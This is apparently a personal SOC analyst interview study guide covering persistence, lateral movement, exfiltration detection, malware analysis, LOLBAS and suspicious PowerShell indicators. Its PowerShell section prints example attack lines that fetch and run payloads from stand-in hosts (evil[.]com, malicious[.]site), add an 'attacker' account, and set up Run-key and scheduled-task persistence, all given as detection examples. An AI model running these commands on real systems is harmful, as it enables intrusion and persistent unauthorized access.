# SOC Analyst Level 2 interview preparation 2025

Lateral movement is when an attacker, after gaining initial access to a system, moves across the network to find and access other systems, accounts, or data. They do this to escalate privileges, maintain persistence, or reach their target (like a domain controller or sensitive data).

The material is mainly focused for a MSSP environment and as an L2, I should be familiar with answering the common investigative questions related to:

•	How something got to the asset - Initial Access Vector<br/>
•	Is it still there? - Persistence<br/>
•	Where did they go? - Lateral Movement<br/>
•	Prove that something was taken - Data Exfiltration<br/>

Those topics above where a very good start to guide me thorough what to review. Additionally, I added more topics as I was reviewing and remembering content that I already knew but needed a refresh or a more structure understanding to be able to explain. 

____

## **Persistence**

Persistence refers to a threat actor's ability to maintain a foothold in a compromised system over time, even after reboots or other system changes. This involves post-exploitation techniques that ensure the attacker can regain access, avoid detection, preserve privileges, and maintain flexibility to reestablish access if needed. 

To assess persistence, I would check for common persistence mechanisms such as registry modifications, scheduled tasks, startup folder entries, and new services that may have been created.

**Goals of Persistence**<br/>
• Regain Access: Ensuring the ability to reconnect to the compromised system.<br/>
• Avoid Detection: Implementing methods that are stealthy to avoid being caught by security systems or analysts.<br/>
• Preserve Privileges: Maintaining or escalating privileges to perform necessary actions.<br/>
• Flexibility to Reestablish Access: Using different methods to re-enter the system if one is blocked or removed.<br/>

**Techniques for Achieving Persistence**
• Create New Accounts: net user /add to create new user accounts with administrator privileges to ensure continued access.<br/>
• ASEPs (Auto-Start Extensibility Points): Modifying points in the system where programs are configured to start automatically, such as startup folders, registry run keys, or services.<br/>
•	Registry Run Keys: Adding or modifying registry keys that cause programs to execute upon system startup:
```
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```
•	Netcat Listeners / Reverse TCP Shells:	Deploying tools like Netcat to listen for incoming connections or establishing reverse shells that call back to the attacker's server.<br/>
• Scheduled Tasks / WMI (Windows Management Instrumentation): Creating scheduled tasks to execute malicious scripts or programs periodically or upon certain events. WMI can be used for more complex event-driven persistence mechanisms.<br/>
• Active Directory Exploits (e.g., Golden Ticket): Utilizing Kerberos exploits, such as the Golden Ticket, to create forged authentication tokens that provide long-term access to AD environments.<br/>
•	Web Shells: Compromising a web server and inserting a web shell to provide remote access via HTTP/S, allowing the attacker to execute commands on the server.<br/>

## **Lateral Movement**

Lateral movement is when an attacker, after gaining initial access to a system, moves across the network to find and access other systems, accounts, or data. They do this to escalate privileges, maintain persistence, or reach their target (like a domain controller or sensitive data).

**Stages of lateral movement**<br/>

Lateral movement attacks typically follow a methodical progression that allows attackers to expand their control within a network:<br/> 
**1.	Initial compromise:** The attacker gains entry through a vulnerable endpoint, often via phishing attacks, exploiting an unpatched vulnerability, or compromising credentials.<br/>
**2.	Reconnaissance:** Once inside, attackers spend time observing and mapping the network, identifying potential targets, understanding access controls, and discovering valuable assets.<br/>
**3.	Credential harvesting:** Attackers gather user credentials from the initially compromised system using techniques like keylogging, memory scraping, or accessing stored passwords.<br/>
**4.	Privilege escalation:** Using the harvested credentials or exploiting vulnerabilities, attackers elevate their permissions to gain administrative or system-level access.<br/>
**5.	Lateral movement execution:** With elevated privileges, attackers move to other systems by authenticating with stolen credentials or exploiting trust relationships between machines.<br/>
**6.	Persistence establishment:** Throughout the process, attackers create backdoors and alternative access methods to ensure they maintain access even if the original entry point is discovered and remediated.<br/>
**7.	Data discovery and exfiltration:** Once valuable assets are located, attackers extract sensitive information, often encrypting or disguising the data leakage to avoid detection.<br/>

**Key Behaviors Indicative of Lateral Movement**<br/>
**• Internal Reconnaissance:** Attackers probe the network for information about system configurations, user accounts, and shared resources to identify potential targets for lateral movement.<br/>
**• Privilege Escalation Attempts:** Efforts to gain higher access levels using known vulnerabilities, credential theft, or exploitation of misconfigurations.<br/>
**• Use of Remote Protocols:**	Exploitation of remote management protocols like RDP, SSH, or SMB to move between systems.<br/>
**• Network Mapping:** Scanning for open ports and services on internal systems to identify potential avenues for lateral movement.<br/>
**• Access to Shared Resources:**	Unauthorized access to network shares or databases, often using compromised credentials or exploiting trust relationships.<br/>
**• Execution of Scripts and Commands:**	Running scripts or commands that automate the movement between systems, deploy payloads, or extract data.<br/>

**Pivoting vs. Lateral Movement**
Pivoting is the attacker’s strategy to expand their reach from a specific point. It’s like breaking into a single room and then figuring out how to access other areas using that room. 
Lateral movement is more about maintaining a low profile while gathering credentials or data, like sneaking from room to room unnoticed. What sets them apart is that pivoting is the first move after breaching a weak spot. It’s like finding a compromised server and then using it as a base to access other servers within the network. The attacker might use tools like Metasploit to exploit vulnerabilities from this initial access point. For example, after breaking into a web server, they may access a database server connected to it through existing trust relationships. Lateral movement often comes after pivoting. Once attackers have infiltrated further, they start exploring the internal landscape. 

**Common protocols and tools**<br/>
**•	RDP<br/>
•	SMB<br/>
•	WMI<br/>
•	WinRM<br/>
•	Kerberos<br/>
•	LANMAN/ NTLM<br/>
•	Pass the hash/token<br/>
•	SSH (not often seen)<br/>
•	PSExec (not a protocol but methodology)<br/>
•	Cobalt Strike<br/>
•	Impacket**<br/>

## **Data Exfiltration**<br/>

To confirm data exfiltration, I would analyze network logs for large data transfers to external IP addresses and protocol analysis for HTTP, HTTPS, FTP, and DNS. I would also examine endpoint logs and system changes for signs of data packaging or compression activities. Reviewing firewall logs for unusual outbound traffic patterns can provide evidence of exfiltration. Tools like DLP (Data Loss Prevention) can be used to track sensitive data movement and validate exfiltration attempts.

**Data Exfiltration vs. Data Leakage vs. Data Breach**<br/>

**Data Exfiltration** is a deliberate, targeted extraction of data from a secure system. It involves the unauthorized transfer of data to an external destination and typically requires malicious intent. This occurs through sophisticated attack methods like malware deployment, social engineering, or exploitation of system vulnerabilities.

**Data Leakage** occurs when sensitive information is unintentionally exposed due to human error or system misconfiguration. Common examples include misconfigured cloud storage, accidental email attachments, or improper data handling. Unlike exfiltration, leakage doesn’t require malicious intent and often results from negligence or lack of security awareness.

**Data Breach** encompasses a broader category of security incidents where unauthorized access to protected information occurs. It can result from either exfiltration or leakage and includes any incident involving unauthorized disclosure, loss of control, or data compromise.

**How to Detect Data Exfiltration**<br/>
•	Monitoring DNS queries<br/>
•	Monitor suspicious file compression or encryption<br/>
•	Analyzing outbound email traffic<br/>
•	Tracking file access patterns that involves file extensions and large file transfers<br/>
•	Implementing data loss prevention (DLP) solutions: DLP systems can actively monitor and restrict the movement of sensitive data, alerting security teams when potential exfiltration attempts are detected<br/>
•	Employing UEBA (User and entity behavior analytics) tools to establish a baseline of normal user activity, alerting teams to deviations that could signify malicious intent<br/>

**Suspicious IOCs:**<br/>

•	Suspicious file compression or encryption<br/> 
• Monitor beaconing behavior - Regular, periodic outbound connections<br/> 
• Use of command-line tools for transfer - Use of curl, wget, ftp, scp, Invoke-WebRequest, or bitsadmin<br/> 
• Unusual locations - Sensitive files copied to temp folders, recycle bin, or hidden directories before transfer<br/> 
• Excessive file access or copying - User accessing or copying large numbers of files in a short time from file shares or sensitive directories<br/> 

____

## **Binary / Malware Analysis**

**Static Malware Analysis**

Static analysis involves examining malware without executing it. This method focuses on analyzing the file's structure, code, and metadata to understand its functionality and potential impact.

**•	File Hashing:** Calculate hashes (e.g., MD5, SHA-256) for the malware file to check against known malware databases.<br/>
**•	Disassembly:** Use tools like IDA Pro or Ghidra to disassemble the code and understand its logic.<br/>
**•	String Analysis**<br/>
**•	Metadata Examination:** Analyze the file's metadata, such as PE headers in Windows executables, to identify compilation details and potential anomalies.<br/>

In PowerShell, you can calculate hashes using:
```
Get-FileHash -Algorithm SHA256 -Path $filePath
```
In Linux, you can use built-in commands to calculate file hashes:
```
md5sum
sha1sum
sha256sum
md5sum /path/to/your/file
```

**Dynamic Malware Analysis**

Dynamic analysis involves executing the malware in a controlled environment (sandbox) to observe its behavior and interactions with the system.

**•	Sandboxing:**  Use sandbox environments like Cuckoo Sandbox or Any.Run to safely execute the malware and monitor its behavior.<br/>
**•	Network Monitoring:**  Observe network connections made by the malware using tools like Wireshark or Fiddler.<br/>
**•	Process Monitoring:**  Use tools like Process Monitor (Procmon) to track file, registry, and process activities.<br/>
**•	API Monitoring:**  Use tools like API Monitor to track system calls made by the malware.<br/>

IOCs for Dynamic Analysis:<br/>
**•	Network Connections:**  Unexpected outbound connections to known malicious domains or IP addresses.<br/>
**•	File and Registry Changes:**  Creation of new files or registry keys, especially in startup locations.<br/>
**• Process Activity:**  Unusual processes spawned by the malware, often with suspicious names or paths.<br/>

**Other techniques:**

**•	VM Snapshot:** Primarily used in dynamic malware analysis. It allows analysts to quickly revert to a clean state of a virtual machine, which is useful for observing the behavior of malware without permanent changes to the system.<br/>

**•	Regshot:** Used in dynamic malware analysis. It takes snapshots of the registry before and after running a program, allowing analysts to compare changes and understand what modifications the malware makes to the system registry.<br/>

**•	Process Monitor:** Used in dynamic malware analysis. It monitors and logs real-time system activity, such as file system, registry, and process operations, helping analysts observe the behavior of malware as it executes.<br/>

**•	IDA Pro:** Used in static malware analysis. It is a disassembler and debugger that helps reverse engineers analyze the code structure and logic of a binary without executing it, enabling them to understand the functionality of malware.<br/>

**•	Ghidra:** Also used in static malware analysis. It is a reverse engineering tool that provides capabilities for disassembling, decompiling, and analyzing binaries to understand the code's behavior and logic without execution.<br/>

Step by Step approach for binary analysis:

Perform initial assessment analyzing the file type and format and determine which type of binary it is (e.g., executable, library) and format (e.g., PE for Windows, ELF for Linux).
Followed by static analysis via hash calculation and analysis against OSINT databases like VirusTotal. 
Analyze file header and metadata inspection
Another option is to use a disassembler like IDA Pro or Ghidra allowing to inspect the logic without executing it 
A more advanced option is to perform dynamic analysis via behavioral investigation via sandbox execution, process monitoring,	network traffic analysis. Using a debugger also could give insights on runtime behavior and to trace function calls, like identifing dlls that were injected into a process.  
Moreover, memory analysis is another option to inspect the memory of the running process using tools like Volatility to uncover hidden data or injected code.

Additional information:
 
PE (Portable Executable) and ELF (Executable and Linkable Format) are file formats used by Windows and Linux operating systems, respectively, to store executable binaries, libraries, and other related data. These formats define how the system loads and executes programs.

The PE format is used for executables (.exe), object code, and DLLs (Dynamic Link Libraries) on Windows. It includes headers and sections that define the binary's layout and behavior. 

ELF (Executable and Linkable Format) for Linux is used for executables, object files, shared libraries, and core dumps on Unix-like systems, including Linux.
 
Detecting a suspicious PE or ELF file involves analyzing indicators that deviate from typical behavior or characteristics expected of benign executables. Here are examples for each format that might raise suspicion:

**•	Unexpected or Unknown Source**
**•	Executable in Unexpected Locations**
**•	Abnormal File Attributes**
**•	Packers and Obfuscation**
**•	Suspicious API calls**
**•	Unexpected network connections**
**•	Establish persistence by modifying the registry or creating scheduled tasks / cron jobs**

____

## **SMB**

SMB is an application-layer network protocol used primarily for providing shared access to files, printers, and other network resources. It also facilitates network browsing and remote administration features. SMB has been around for decades, and its legacy versions, especially SMBv1, have numerous vulnerabilities. These vulnerabilities often become entry points for attacks due to the protocol's complexity allowing to gain initial access and perform exploitation and pivoting activities.

**SMB key functions:**<br/>

**•	File Sharing:** SMB allows users to read, write, and execute files on remote servers. This is foundational for network file systems and is extensively used in enterprise environments.<br/>
**•	Authentication:** SMB uses NTLM or Kerberos for user authentication to ensure that only authorized users can access resources.<br/>
**•	Remote Administration:** It supports remote administration tasks, which can be useful for managing networked computers but also poses security risks if misconfigured.<br/>

**SMB Versions:**<br/>

**•	SMBv1:** Should be disabled due to numerous vulnerabilities. It lacks modern security features and is considered unsafe.<br/>
**•	SMBv2.1:** Introduced improvements over v1 but still lacks the security features of later versions.<br/>
**•	SMBv3 (including v3.1.1):** The most recent version includes encryption support and pre-authentication integrity checks, significantly enhancing security.<br/>

**SMB and NTLM**<br/>
**•	NTLM (NT LAN Manager):** An older authentication protocol used by SMB. It uses a challenge-response mechanism but has vulnerabilities like pass-the-hash and NTLM relay attacks.<br/>
**•	Security Concerns:** Due to its vulnerabilities, NTLM is not recommended for secure environments. Instead, Kerberos is preferred for its stronger security features.<br/>
**•	Modern Usage:** While NTLM is still used for compatibility with older systems, Microsoft recommends using Kerberos, which is more secure and supports features like mutual authentication.<br/>

**Famous CVEs:**<br/>
**EternalBlue (CVE-2017-0144):** A critical vulnerability in SMBv1 that was exploited by the WannaCry ransomware. It allows remote code execution and has been used in numerous attacks.<br/>
**WannaCry:** A ransomware attack that used EternalBlue to spread rapidly across networks.<br/>
**SMBGhost (CVE-2020-0796):** A vulnerability in SMBv3 that could allow attackers to execute code remotely on vulnerable systems.<br/>
**SMBleed (CVE-2020-1206):** A related vulnerability to SMBGhost that leaks kernel memory, potentially allowing information disclosure.<br/>

____

## **DNS**

Domain Name System analysis is a crucial aspect of network security monitoring because DNS is a fundamental protocol that translates human-readable domain names into IP addresses, enabling communication over the internet. However, attackers can exploit DNS for malicious purposes, including C2 communication and data exfiltration. 

**DNS Tunneling:**<br/>
•	Attackers can use DNS tunneling to encapsulate data or commands within DNS queries and responses. This allows them to bypass traditional network defenses by disguising traffic as legitimate DNS queries.<br/>
•	To avoid detection and DNS caching, attackers often generate numerous unique subdomains for their C2 channels. A high volume of unique subdomains can be a strong IOC.<br/>

**DNS for Network Communication:**<br/>
•	DNS is essential for translating domain names into IP addresses. Analyzing DNS logs can provide insights into network traffic patterns and identify unusual or malicious activity.<br/>

**DNS Analysis Techniques**<br/>

•	Top DNS queries and abnormal queries: Identify the most frequently queried domains. Sudden spikes or unusual patterns in DNS queries can indicate malicious activity.<br/>
•	Identify High volume FQDN logs: Investigate FQDNs that appear frequently or that are associated with known malicious activity. <br/>
•	Narrow down which host sent DNS requests: Determine which internal hosts are making suspicious DNS requests. <br/>
•	Identify failed DNS Lookups logs: Monitor failed DNS lookups, as they may indicate attempts to contact non-existent or newly registered domains.<br/>

## **LOLBAS**

Living Off the Land Binaries And Scripts is a technique used by attackers to exploit legitimate system tools and executables to perform malicious activities. This approach allows attackers to bypass security mechanisms such as application whitelisting, intrusion detection systems, and antivirus solutions, as these tools are typically trusted and not flagged as malicious. Attackers use pre-installed system binaries and scripts to execute attacks. These tools are part of the operating system or commonly installed applications, making them less likely to be scrutinized by security systems.

Summary of each tool:

**• certutil.exe:** A command-line utility for managing and manipulating certificates, certificate services, and keys in Windows. It is often used for tasks like importing, exporting, and verifying certificates.<br/> 

**• mshta.exe:** A tool that executes Microsoft HTML Applications (HTA) files. HTA files are HTML-based applications that can run scripts, making mshta.exe a common vector for executing scripts on Windows.<br/> 

MSHTA includes both mshta.exe and its underlying host DLL, mshtml.dll, which can be executed directly as an alternative through rundll32.exe. Adversaries might consider abusing mshta because aside from it being an already built-in utility, it supports the execution of arbitrary VBScript or jScript code either from within a file, executed inline on the command line, or retrieved directly from a malicious URL. It also allows for creative packaging in malicious payloads where HTA content can be stuffed into nearly any existing file format without invalidating an otherwise legitimate file. In fact, it's even possible to embed HTA content into signed files without invalidating their signature, also making it a target for phishing payloads. The main trend currently is the abuse of MSHTA to deliver infostealer malware like LummaC2 and Vidar. A good indicator is that if HTA content is executed from within the context of rundll32.exe, it is almost guaranteed to be malicious activity.

**• regsvr32.exe:** A command-line utility used to register and unregister DLLs and ActiveX controls in the Windows Registry. It is frequently used in application installation and configuration processes.<br/> 

**• rundll32.exe:** A system utility that allows the execution of DLL functions from the command line. It is often used to call specific functions within DLLs, enabling the automation of various tasks.<br/>

**• wmic.exe:** The Windows Management Instrumentation Command-line (WMIC) utility provides a command-line interface for accessing WMI data. It allows users to query system information, manage tasks, and interact with the Windows environment.<br/> 

**• bitsadmin.exe:** A command-line tool for managing Background Intelligent Transfer Service (BITS), which facilitates asynchronous file transfers between machines. It is often used for downloading or uploading files in the background.<br/> 

**• msbuild.exe:** Microsoft's build platform for building applications. It is used to compile, package, and deploy software projects based on configuration files and scripts.<br/> 

**• installutil.exe:** A command-line utility for installing and uninstalling .NET Framework applications and components. It is commonly used to register and configure services and applications.<br/> 

**•schtasks.exe:** A command-line utility for creating, deleting, querying, changing, running, or ending scheduled tasks on a Windows system. It is used to automate tasks and manage the Task Scheduler.<br/> 
____

## **PowerShell**  

PowerShell is a powerful scripting language and command-line shell used extensively in Windows environments for task automation, configuration management, and system administration. While it provides significant capabilities for legitimate users, it is also a tool that attackers commonly exploit for malicious activities 

Indicators of suspicious PowerShell activity  

**• Encoded commands:** Attackers may use the -EncodedCommand parameter to obfuscate their scripts, making it harder to detect malicious intent.<br/> 
```
powershell.exe -EncodedCommand SQBFAFgAIAByAGUAbQAuAGkAbgBpAHQAKAApAA==
```
**• External script downloads:** Scripts that download and execute external executables from malicious URLs are a common. **Invoke-WebRequest** or **Invoke-Expression** used with URLs.<br/>
```
IEX (New-Object Net.WebClient).DownloadString('http://malicious[.]site/payload.ps1')
```
```
Invoke-WebRequest -Uri "http://evil[.]com/malware.exe" -OutFile "C:\Users\Public\malware.exe"
Start-Process "C:\Users\Public\malware.exe"
```
**• Hidden windows:** Scripts that use **-WindowStyle Hidden** or **Start-Process** with hidden window options can indicate attempts to avoid detection.<br/>
```
Start-Process "cmd.exe" -WindowStyle Hidden -ArgumentList "/c whoami"
```
```
powershell.exe -WindowStyle Hidden -Command "Invoke-Something"
```
**• String manipulation and concatenation:** Malicious scripts often break down commands into strings and use concatenation to evade detection by static analysis tools.<br/>
```
$cmd = "Invo" + "ke-Expression"
$payload = "calc.exe"
&$cmd $payload
```
**• External command execution:** PowerShell scripts that call external command-line utilities (e.g., cmd.exe, net.exe) can signify attempts to leverage system utilities for malicious purposes.<br/>
```
Start-Process "cmd.exe" -ArgumentList "/c net user attacker P@ssw0rd /add"
```
```
Invoke-Expression "cmd /c whoami"
```
**• Registry interrogation:** Monitoring registry queries and modifications can reveal attempts to establish persistence or gather system information.<br/>
```
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
```
```
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\malware.exe"
```
**• Unusual scheduled tasks:** Creation of unusual or suspicious scheduled tasks can indicate persistence attempts. Check task properties and the last run time for anomalies.<br/>
```
schtasks /create /tn "Updater" /tr "powershell.exe -File C:\malicious.ps1" /sc minute /mo 5
```
**• Log analysis:** Use **Get-WinEvent** to review unusual log entries, especially those related to PowerShell script block logging (Event ID 4104) and pipeline execution (Event ID 4103).<br/>

## **PUPs**

Potentially Unwanted Programs are a category of software that, while not overtly malicious like traditional malware, often exhibit behaviors that users find undesirable or intrusive. These programs typically installed alongside legitimate software, usually without explicit user consent. This bundling tactic is common in free software downloads, where users might overlook additional programs being installed. 

PUPs are often rated as highly malicious in OSINT platforms like VirusTotal for several reasons. While PUPs are not designed to be overtly harmful like traditional malware, their behaviors and characteristics can trigger high threat ratings like:<br/> 

**• Behavioral similarity to malware:** Some PUPs exhibit behaviors similar to malware, such as installing without explicit consent, modifying system settings, or persisting in ways that make them difficult to remove.<br/> 

**• Bundled with malware:**	PUPs are often distributed through software bundling, and in some cases, they may be bundled with actual malware or serve as a delivery mechanism for more harmful software.<br/>

**• Privacy violations:** PUPs often collect user data without clear consent, which can be considered a significant privacy violation. This behavior is sometimes flagged as malicious due to its potential for misuse or data leakage.<br/> 

**• Persistence and evasion techniques:** The use of persistence mechanisms and evasion techniques to avoid detection and removal can cause PUPs to be rated more severely. Techniques such as modifying the registry or creating scheduled tasks are often associated with malicious intent.<br/> 

**• Reputation and history:** If a particular PUP has a history of being linked to malicious activities or has been used in conjunction with malicious campaigns, OSINT platforms may rate its hashes more critically.<br/> 

**• Aggressive advertising and monetization:** PUPs that aggressively monetize through intrusive ads or redirect users to potentially harmful sites can be rated as highly malicious due to their negative impact on user experience and potential security risks.<br/> 

**• Previous reports and community feedback:** Community feedback and previous reports of negative experiences with a PUP can influence its rating. If users frequently report issues or associate the PUP with malicious behavior. Additionally, VirusTotal aggregates results from multiple antivirus vendors. If a PUP is detected by a majority of these vendors as having malicious characteristics, its overall threat rating will be higher.<br/> 

PUP common behaviors:<br/> 
**• Adware:** Displays intrusive advertisements, often redirecting users to specific websites.<br/> 
**• Browser hijackers:** Modify browser settings, such as the default search engine or homepage, to redirect traffic to specific sites.<br/> 
**• Spyware:** Collects user data without explicit consent, potentially leading to privacy violations.<br/> 
**•	Dialers:** Automatically dial phone numbers, often resulting in high charges, though less common today with the decline of dial-up internet.<br/>

## **Cyber Kill Chain** 

https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html

The Cyber Kill Chain was developed by Lockheed Martin and it models the stages of a cyberattack. The seven stages of the cyber kill model demonstrate a specific goal along with a threat actor's path. It is focused more in the progression of attacks:

**1.	Reconnaissance:** The attacker gathers information about the target, such as network structure, vulnerabilities, and personnel details.<br/>
**2.	Weaponization:** The attacker creates malware tailored to exploit specific vulnerabilities identified during reconnaissance.<br/>
**3.	Delivery:** The attacker delivers the malware to the target, often via phishing emails, malicious websites, or infected USB drives.<br/>
**4.	Exploitation:** The malware exploits a vulnerability in the target system, allowing the attacker to execute code.<br/>
**5.	Installation:** The malware is installed on the target system, establishing a foothold.<br/>
**6.	Command and Control:** The attacker establishes communication with the compromised system, allowing remote control.<br/>
**7.	Actions on Objectives:** The attacker achieves their goals, such as data exfiltration, system disruption, or further propagation within the network.<br/>

## **Tcpdump**

Command-line packet analysis tool that allows users to capture and examine network traffic. It's widely used by network administrators and security professionals for troubleshooting, network performance analysis, and security auditing. 
____

## **Nmap**

Nmap (Network Mapper) is a widely-used open-source tool for network discovery and security auditing.  It includes network discovery and mapping, port scanning, service version detection, and operating system detection capabilities. 

**Host Discovery Techniques**<br/>

**Default Host Discovery:** Before initiating a port scan, Nmap performs host discovery to determine which hosts are up. By default, it may use methods like ICMP echo requests, TCP SYN to port 443, and TCP ACK to port 80.<br/>

**ARP Scanning:** On a local network, Nmap uses ARP (Address Resolution Protocol) to map IP addresses to MAC addresses. ARP scans are fast and reliable since ARP requests are not filtered by firewalls on the local subnet.<br/>

**ARP Review:** ARP is used to map IP addresses to physical MAC addresses on a local network. It broadcasts an ARP request for a specific IP, and the device with that IP responds with its MAC address. The mapping is stored in an ARP cache to speed up future requests. ARP is vulnerable to spoofing attacks, where an attacker sends fake ARP messages to associate their MAC address with another IP address, potentially intercepting or disrupting traffic.

____

## **Hashcat**

Password cracking tool through various attack methods. It's known for its speed and flexibility, supporting a wide range of hashing algorithms and running efficiently on both CPU and GPU hardware. 

____

## **Netcat**

Netcat is a versatile utility used for reading, writing, and transferring data across network connections. It operates in both client and server modes, enabling a wide range of functions from simple data transfers to complex network debugging and security testing.

**•	Client Mode:** Netcat can initiate connections to remote hosts, making it useful for testing server responses and sending data.<br/>
**•	Listen Mode:** It can listen for incoming connections, turning your machine into a server, which is helpful for receiving data or setting up a basic TCP/UDP server.<br/>
**•	Data Transfer:**	Netcat can transfer files and data streams between hosts, making it useful for simple file transfers or as a rudimentary backup solution.<br/>
**•	Port Scanning:** Although not as sophisticated as dedicated port scanners like Nmap, Netcat can scan open ports on a target host, providing a quick overview of available services.<br/>

Additional information related to security info

**•	Backdoors and Relays:**<br/>
Attackers can use Netcat to create backdoors by setting it to listen mode on a target system, allowing them to connect back at any time.<br/>
It can also be used to create relays, which are one-way connections that bypass firewalls and make it difficult to trace the origin of an attack or connection.<br/>
A single Netcat relay can be used to pivot through multiple hosts, helping attackers move laterally within a network.<br/>
**•	Named Pipes:**<br/>
In Windows environments, attackers may use named pipes with Netcat to obtain responses from a target. Named pipes allow inter-process communication, which can be exploited to relay data between processes on a compromised host. <br/>
